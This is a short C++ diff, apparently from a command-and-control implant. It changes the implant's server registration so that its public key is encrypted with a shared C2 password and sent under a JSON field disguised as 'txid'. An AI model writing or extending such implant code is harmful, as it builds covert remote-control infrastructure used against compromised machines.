@@ -23,7 +23,11 @@ MalleableProfile *Register(LPCWSTR serverUrl, std::string pubKey, std::string pr
     registerDocument.SetObject();
     rapidjson::Document::AllocatorType &allocator = registerDocument.GetAllocator();
     rapidjson::Value pubKeyVal(pubKey.c_str(), allocator);
-    registerDocument.AddMember("txid", pubKeyVal, allocator);
+    string password(C2_REGISTER_PASSWORD);
+    // Encrypt pubKey with password
+    string payload = encryptB64SecretBox(password, pubKey);
+    rapidjson::Value payloadVal(payload.c_str(), allocator);
+    registerDocument.AddMember("txid", payloadVal, allocator);
 
     rapidjson::StringBuffer buffer;
     rapidjson::Writer<rapidjson::StringBuffer> writer(buffer);
